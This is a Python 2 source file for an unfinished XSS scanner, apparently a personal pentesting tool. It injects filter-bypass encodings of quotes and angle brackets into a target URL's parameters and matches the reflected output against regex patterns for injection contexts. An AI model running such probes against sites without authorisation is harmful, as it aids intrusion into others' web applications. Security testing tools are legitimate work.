#!/usr/bin/env python
# encoding: utf8
import argparse
import os
import sys
import re
import copy
import string
import urllib
import urlparse
import htmlentitydefs
import random
import requests
from bs4 import BeautifulSoup as bs
from pprint import pprint

import j_pentest_resource

# enumerator-like values used for marking current phase
GET, POST            = "GET", "POST"

# length of random prefix/suffix used in XSS tampering
PREFIX_SUFFIX_LENGTH = 8

# optional HTTP header names
COOKIE, UA, REFERER = "Cookie", "User-Agent", "Referer"

# connection timeout in seconds
TIMEOUT = 3

elementary_payloads = [
    # 参考资料：https://dev.w3.org/html5/html-author/charref
    # 第一个是输入， 第二个是期待的输出，通过不同的编码，试图去绕过过滤
    ( '"', '"' ),  # 双引号, quot
    ( "'", "'" ),  # 单引号, apos

    ( '<', '<' ),  # 小于号 lt
    ( '>', '>' ),  # 大于号 gt

    ( ";", ";" ),  # 分号, semi
    ( '/', '/' ),  # tag的终止符，也许有时候需要这个

    #( ')', ')' ),  # 右括号 lpar
    #( '(', '(' ),  # 左括号 rpar

    #( '{', '{' ),  # 左大括号 lcub, lbrace
    #( '}', '}' ),  # 右边大括号 rcub, rbrace
]

for raw_elementary_payload in copy.deepcopy( elementary_payloads ):
    htmlentitydefs.codepoint2name[39] = 'apos'

    target = raw_elementary_payload[1]
    ord_payload = ord( raw_elementary_payload[0] )
    hex_payload = hex( ord_payload )[2:]

    urlencoded_payload = urllib.quote( raw_elementary_payload[0] )
    chardef_payload = htmlentitydefs.codepoint2name.get( ord_payload, '' )
    if chardef_payload:
        chardef_payload = '&{};'.format( chardef_payload )
    chardef_payload_upper = htmlentitydefs.codepoint2name.get( ord_payload, '' ).upper()
    if chardef_payload_upper:
        chardef_payload_upper = '&{};'.format( chardef_payload_upper )

    for prefix_zero in range(9):
        ncr_ord = '&#{};'.format( str(ord_payload).rjust(prefix_zero, '0') )
        elementary_payloads.append( (ncr_ord,target) )

        ncr_hex = r'&#x{};'.format( str(hex_payload).rjust(prefix_zero, '0') )
        elementary_payloads.append( (ncr_hex,target) )

    elementary_payloads.extend( [
        ( urlencoded_payload, target ),
        ( chardef_payload, target ),
        ( chardef_payload_upper, target ),
    ] )
elementary_payloads = tuple( set( filter( lambda x:x[0]!='', elementary_payloads ) ) )

pprint( elementary_payloads )

print 'I'.join( map( lambda x:x[0], elementary_payloads ) )
print len('I'.join( map( lambda x:x[0], elementary_payloads ) ))

def retrive_content( url, data='' ):
    headers = { 'user-agent': j_pentest_resource.pc_chrome_ua, }
    for try_index in range(3):
        try:
            r = requests.get( url, headers=headers, timeout=TIMEOUT, allow_redirects=True )
            break
        except:
            pass
    else:
        return ''

    r = r.content.decode( r.encoding if r.encoding else 'utf8', 'ignore' )
    return r

def page_to_leaf( page ):
    def no_child_filter( tag ):
        if tag.find_all( True )==[]:
            return True
        else:
            return False
    soup = bs( page, 'lxml' )
    r = soup.find_all( no_child_filter )
    return r

def page_to_match_count( page, pattern ):
    count = 0
    for leaf in page_to_leaf( page ):
        for match in re.finditer( pattern, leaf.encode('utf8') ):
            count += 1
    return count

def match_index_to_leaf( page, pattern, match_index ):
    i = 0
    for leaf in page_to_leaf( page ):
        for jfdkfjdk in re.finditer( pattern, leaf.encode('utf8') ):
            i += 1
            if i-1 == match_index:
                return leaf
    else:
        print 'match_index ', match_index, 'not found'
        return None

def parse_context( pattern, leaf ):
    context = []
    quote_pattern = r'''{}[^'"<]*(?P<quote_type>['"])'''.format( pattern )

    if leaf.string and leaf.string.find( pattern )!=-1:
        context.append( {
            'type':'tag',
            'name':leaf.name,
            'inside':False,
        } )
    else:
        context.append( {
            'type':'tag',
            'name':leaf.name,
            'inside':True,
        } )
    quote_type = re.search( quote_pattern, leaf.encode('utf8') )
    if quote_type:
        context.append( {
            'type':'quote',
            'double': (quote_type.groupdict()['quote_type']=='"'),
        } )
    return context

def context_to_minimal_required_elementary_payloads( context ):
    context.reverse()
    minimal_required_elementary_payloads = []
    for c in context:
        if c['type'] == 'quote':
            if c['double'] == True:
                minimal_required_elementary_payloads.append( '"' )
            else:
                minimal_required_elementary_payloads.append( "'" )
        elif c['type'] == 'tag':
            if c['name'] == 'script':
                minimal_required_elementary_payloads.append( ';' )
            else:
                minimal_required_elementary_payloads.append( '/' )
                minimal_required_elementary_payloads.append( '>' )
    return minimal_required_elementary_payloads
        
REGULAR_PATTERNS = (
    (r"\A[^<>]*%(chars)s[^<>]*\Z", "\".xss.\", pure text response"),

    (r"<!--[^>]*%(chars)s|%(chars)s[^<]*-->", "\"<!--.'.xss.'.-->\", inside the comment"),

    (r"(?s)<script[^>]*>[^<]*?'[^<']*%(chars)s|%(chars)s[^<']*'[^<]*</script>", "<script>xss</script>, enclosed by <script> tags, inside single-quotes"),

    (r'(?s)<script[^>]*>[^<]*?"[^<"]*%(chars)s|%(chars)s[^<"]*"[^<]*</script>', "'<script>xss</script>', enclosed by <script> tags, inside double-quotes"),

    (r"(?s)<script[^>]*>[^<]*?%(chars)s|%(chars)s[^<]*</script>", "<script>xss</script>, enclosed by <script> tags"),

    (r">[^<]*%(chars)s[^<]*(<|\Z)", ">xss< outside of tags"),

    (r"<[^>]*'[^>']*%(chars)s[^>']*'[^>]*>", "<xss>, inside the tag, inside single-quotes"),

    (r'<[^>]*"[^>"]*%(chars)s[^>"]*"[^>]*>', "<xss>, inside the tag, inside double-quotes"),

    (r"<[^>]*%(chars)s[^>]*>", "<xss>, inside the tag, outside of quotes"),
)

def scan_page(url, data=None):

    retval, usable = False, False

    url, data = re.sub(r"=(&|\Z)", "=1\g<1>", url) if url else url, re.sub(r"=(&|\Z)", "=1\g<1>", data) if data else data

    tag = prefix = suffix = ''.join( random.sample( string.ascii_lowercase, PREFIX_SUFFIX_LENGTH ) )
    tag = prefix = suffix = 'IIIIIIII' # debug tag, easy to search
    separator = 'I'

    #for phase in (GET, POST):
    for phase in (GET, ):

        current = url if phase is GET else (data or "")

        for match in re.finditer(r"((\A|[?&])(?P<parameter>[\w\[\]]+)=)(?P<value>[^&#]*)", current):
            
            found, usable = False, True
            context_list = []

            print "* scanning %s parameter '%s'" % (phase, match.group("parameter"))

            # baseline request
            tampered = current.replace( match.group(0), match.group(0) + tag )
            r = retrive_content( tampered )

            baseline_match_count = len( re.findall( tag, r ) )

            print 'baseline_match_count:', baseline_match_count
            if not baseline_match_count:# parameter not found in response, impossible to hack
                continue

            #context = context_list[match_index]
            #minimal_required_elementary_payloads = context_to_minimal_required_elementary_payloads( context )
            available_elementary_payloads = []
            available_attack_payloads = []

            payload = urllib.quote( separator.join( map( lambda x:x[0], elementary_payloads ) ) )
            payload_pattern = r'{prefix}(?P<payload_output>.*?){suffix}'.format( prefix=prefix, suffix=suffix )

            # tampered url( GET ) or tampered data( POST )
            tampered = current.replace( match.group(0), match.group(0) + '{}{}{}'.format(prefix, payload, suffix) )

            r = retrive_content( tampered )

            for payload_match in re.finditer( payload_pattern, r ):
                
                payload_output = payload_match.groupdict()['payload_output']

                print payload, '->', payload_output

                print '-'*30
                
                payload_output = payload_output.split( separator )
                if len(payload_output) != len(elementary_payloads):
                    print 'payload_output pattern changed, cannot match against elementary_payloads'
                else:
                    for i in range(len(elementary_payloads)):
                        print elementary_payloads[i], '->', payload_output[i]
                

            #for payload in elementary_payloads:
            #    payload_pattern = r'{prefix}(?P<payload_output>.*?){suffix}'.format( prefix=prefix, suffix=suffix )

            #    # tampered url( GET ) or tampered data( POST )
            #    tampered = current.replace( match.group(0), match.group(0) + '{}{}{}'.format(prefix, payload[0], suffix) )

            #    r = retrive_content( tampered )

            #    for payload_match in re.finditer( payload_pattern, r ):

            #        print payload, '->', payload_match.groupdict()['payload_output']

            #        if payload[1] == payload_match.groupdict()['payload_output']:
            #            available_elementary_payloads.append( payload )

            #        print '-'*30

            print set(available_elementary_payloads)
            print '='*30
            print '='*30
            print '='*30

    return retval

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", dest="url", required=True, help="Target URL (e.g. \"http://www.target.com/page.php?id=1\")")
    parser.add_argument("--data", dest="data", help="POST data (e.g. \"query=test\")")
    parser.add_argument("--cookie", dest="cookie", help="HTTP Cookie header value")
    parser.add_argument("--user-agent", dest="ua", default="Mozilla/5.0 (Windows NT 6.1; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0", help="HTTP User-Agent header value")
    parser.add_argument("--referer", dest="referer", help="HTTP Referer header value")
    args = parser.parse_args()

    result = scan_page(args.url, args.data)
    print result
